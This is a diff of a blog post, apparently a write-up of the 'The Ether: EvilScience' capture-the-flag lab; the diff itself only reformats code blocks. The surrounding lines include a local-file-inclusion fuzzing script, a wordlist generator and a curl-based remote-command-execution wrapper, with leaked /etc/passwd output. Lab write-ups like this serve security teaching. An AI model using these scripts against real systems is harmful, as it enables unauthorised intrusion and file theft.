@@ -1,6 +1,6 @@
 ---
 layout: post
-last_modified_at: 2018-06-27 10:54:01 +0000
+last_modified_at: 2018-08-05 00:15:40 +0000
 title: "The Ether: EvilScience Walkthrough"
 subtitle: "This Isn't Bad Science. It's Evil Science."
 category: Walkthrough
@@ -118,7 +118,8 @@ The parameter allows absolute path in the URL but some kind of filtering for com
 
 Here's what I imagine the PHP code in `/index.php` to look like.
 
-{% highlight php linenos %}
+<div class="filename"><span>index.php</span></div>
+```php
 <?php
     $file = $_GET["file"];
     if (preg_match("/(etc|proc|var|php:)/", $file)) {
@@ -128,12 +129,12 @@ Here's what I imagine the PHP code in `/index.php` to look like.
         include($file);
     }
 ?>
-{% endhighlight %}
+```
 
 To that end, I wrote `fuzz.sh`, a `bash` script to map out the **DocumentRoot** by exploiting the `file` parameter, and fuzzing with the wordlists from [SecLists][5]. For this to work, a unique known string in the file must exists.
 
-{% highlight bash linenos %}
-# cat fuzz.sh
+<div class="filename"><span>fuzz.sh</span></div>
+```bash
 #!/bin/bash
 
 HOST=192.168.198.130
@@ -150,7 +151,7 @@ for word in $(cat "$WORDLIST"); do
         break;
     fi
 done
-{% endhighlight %}
+```
 
 Now, let's give `fuzz.sh` a shot.
 
@@ -175,8 +176,8 @@ Moving up the next level got me stuck for hours. Not knowing how to move forward
 
 Using that as base, I created a custom wordlist with `python`.
 
-{% highlight python linenos %}
-# cat crunch.py
+<div class="filename"><span>crunch.py</span></div>
+```python
 #!/usr/bin/env python
 
 import itertools
@@ -188,7 +189,7 @@ for word in map(''.join, itertools.product(*zip(s.lower(), s.upper()))):
     print word
 
 # ./crunch.py theether.com > custom.txt
-{% endhighlight %}
+```
 
 Using the custom wordlist with `fuzz.sh`, I'm able to map out the next level.
 
@@ -254,8 +255,8 @@ Content-Type: text/html; charset=iso-8859-1
 
 With this in mind, I wrote another script to clean up the output from the remote command execution.
 
-{% highlight bash linenos %}
-# cat cmd.sh
+<div class="filename"><span>cmd.sh</span></div>
+```bash
 #!/bin/bash
 
 HOST=192.168.198.130
@@ -285,7 +286,7 @@ curl -s \
 | sed -nr '/<pre>/,/<\/pre>/p;/<\/pre>/q' \
 | sed -e 's/.*<pre>//g' -e 's/<\/pre>.*//g' \
 | sed '$d'
-{% endhighlight %}
+```
 
 Let's give it a shot.
 
@@ -300,8 +301,8 @@ sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
 
 Not the PHP code I imagine but close.
 
-{% highlight php linenos %}
-# ./cmd.sh -e "cat index.php"
+<div class="filename"><span>index.php</span></div>
+```php
 <?php
     $file = $_GET["file"];
 
@@ -320,7 +321,7 @@ if ($file == "/var/log/auth.log") {
 }
     include($file);
 ?>
-{% endhighlight %}
+```
 
 Awesome. Now that I can execute remote commands, it's reverse shell time. I always like my reverse shell in Perl whenever it's available on the target system.
 
